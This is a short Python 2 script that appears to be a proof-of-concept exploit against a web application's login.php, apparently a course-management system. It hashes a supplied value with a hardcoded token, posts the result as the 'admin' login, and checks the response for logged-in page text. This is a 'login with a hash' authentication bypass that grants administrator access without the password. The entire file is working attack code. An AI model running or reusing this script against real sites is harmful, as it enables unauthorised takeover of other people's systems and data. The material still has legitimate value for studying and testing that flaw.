import sys 
import requests 
import hashlib

#hashlib.sha1(b"password").hexdigest() 
#b67a7128bac7c01f53e00e1fa1592db0bf088cd8  token + password 
def gen_hash(passwd ,token):
	gen = hashlib.sha1(passwd+token).hexdigest() 
	return gen
		

def we_can_login_with_a_hash():
	
	target = "http://%s/login.php" % sys.argv[1]
	token ="20b0f420421e98407c9da0ad0cd5d9391eaac89f"
	hashed = gen_hash(sys.argv[2],token)
	print hashed
	d = {
	   "from_password_hidden" : hashed , 
	   "from_login" : "admin" , 
	   "submit":"Login",
	   "token": token 
			 }
	print d 
	
	s = requests.Session() 
	r = s.post(target , data=d) 
 	res = r.text 
	if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res: 
		return True 
	return False 
	

		
		
		
		
def main() : 
	if len(sys.argv) != 3:	
		print " usage : %s <target>  <hash> "% sys.argv[0]
		sys.exit(-1)
		
	if we_can_login_with_a_hash():
		print "[+] success ! "
	else: 
		print "[-] failure ! "  
	
	 
	 


if __name__ == "__main__":
	main()
